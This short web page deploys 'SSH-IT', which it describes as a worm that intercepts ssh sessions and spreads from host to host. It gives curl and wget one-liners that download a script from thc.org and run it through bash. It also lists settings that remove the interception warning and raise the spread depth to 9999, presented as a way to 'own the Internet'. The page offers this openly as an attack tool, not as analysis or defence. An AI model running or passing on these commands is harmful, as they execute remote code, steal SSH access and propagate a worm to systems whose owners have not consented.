---
layout: default
---

Use either one of these commands to deploy:
```shell
bash -c "$(curl -fsSL thc.org/ssh-it/x)"
```
```shell
bash -c "$(wget --no-verbose -O- thc.org/ssh-it/x)"
```

To uninstall use:
```
thc_ctl clean
```

### ALPHA TESTING

This is ALPHA STAGE. DO NOT SHARE.
If you know about this then consider yourself special. Join us on [Telegram](https://t.me/thcorg).

ALPHA DEFAULT SETTINGS:
* ```THC_VERBOSE=1``` You will see a warning when *ssh* is being intercepted.
* ```THC_DEPTH=2``` The worm will stop spreading 2 hops from the host where it got deployed.

Take off all safety and run SSH-IT in release mode like this:
```shell
THC_NO_CONDOME=1 bash -c "$(curl -fsSL thc.org/ssh-it/x)"
```

Or go totally bonkers and own the Internet:
```shell
THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL thc.org/ssh-it/x)"
```

### Contact

Twitter: [https://twitter.com/hackerschoice](https://twitter.com/hackerschoice)  
Telegram: [https://t.me/thcorg](https://t.me/thcorg)  
Web: [https://www.thc.org](https://www.thc.org)  
Medium: [https://medium.com/@hackerschoice](https://medium.com/@hackerschoice)  
E-Mail: members@thc.org  


